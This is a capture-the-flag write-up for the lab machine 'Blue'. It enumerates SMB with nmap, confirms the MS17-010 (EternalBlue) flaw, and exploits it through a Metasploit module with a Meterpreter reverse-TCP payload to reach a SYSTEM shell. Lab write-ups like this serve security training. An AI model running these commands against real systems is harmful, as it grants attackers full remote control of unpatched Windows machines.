# Blue

This is the write-up for the box Blue that got retired at the 13th January 2018.
My IP address was 10.10.14.24 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.40    blue.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/blue.nmap 10.10.10.40
```

```markdown
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking SMB (Port 445)

This is a Windows 7 machine with SMB active and as the name suggests, it is probably vulnerable to the **EternalBlue** exploit.
Also known as **CVE-2017-0144** and **MS17-010**.

Checking if the statement is true with an Nmap script:
```markdown
nmap --script=smb-vuln-ms17-010 10.10.10.40
```

```markdown
Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
```

The check is successful and outputs that the box is vulnerable to that particular vulnerability.

### Exploiting the vulnerability

To exploit the vulnerability, we will use **Metasploit** as it has this exploit in the database.
```markdown
msf5 > use exploit/windows/smb/ms17_010_eternalblue

msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0

msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

After running this, it gave us a _Meterpreter_ session and it is possible to start a shell on the box.
```markdown
meterpreter > shell
```

When running `whoami` it tells us that we are _NT Authority\SYSTEM_ and thus have the highest privileges on the box!
